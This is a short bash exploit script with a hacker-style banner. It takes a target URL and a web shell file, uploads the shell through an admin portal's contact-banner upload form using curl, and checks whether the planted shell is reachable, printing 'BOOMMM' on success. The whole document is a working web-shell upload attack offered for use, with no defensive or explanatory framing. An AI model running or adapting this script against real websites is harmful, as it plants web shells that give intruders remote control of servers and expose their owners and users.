#!/bin/bash

RED="$(printf '\033[1;31m')"  GREEN="$(printf '\033[1;32m')" PURPLE="$(printf '\033[1;35m')" RESAT="$(printf '\033[0m')"
cat << EOF
${PURPLE}    ___   ___   _ ${RED}  _    ${GREEN}  _     _     _
${PURPLE}   | |_) | |_) / |${RED} \ \  /${GREEN} | | | | |   | |\ |
${PURPLE}   |_|   |_| \ |_|${RED}  \_\/ ${GREEN} \_\_/ |_|__ |_| \|  ${RESAT}1337r0j4n

EOF

read -p " TARGET: " target
read -p " SHELLL: " shell

if [[ -f $shell ]]; then
    $(curl -s -F "id=1" -F "contactbanner=@$shell" -F "edit_btn=Update" "$target/admin_portal/contact_banner.php")
    get_shell=$(curl -s -o /dev/null --max-time 10 -w "%{http_code}" "$target/admin_portal/web_image/pagebanner/$shell")
        if [[ $get_shell == "200" ]]; then
            echo -e " BOOMMM: ${GREEN}$target/admin_portal/web_image/pagebanner/$shell${RESAT}"
        else
            echo -e " The target that u enter ${RED}wasn't vuln${RESAT} Dude, my bad..."
        fi
else
   echo " The shell name that u enter called ${RED}$shell wasn't found${RESAT}, Bro"
fi
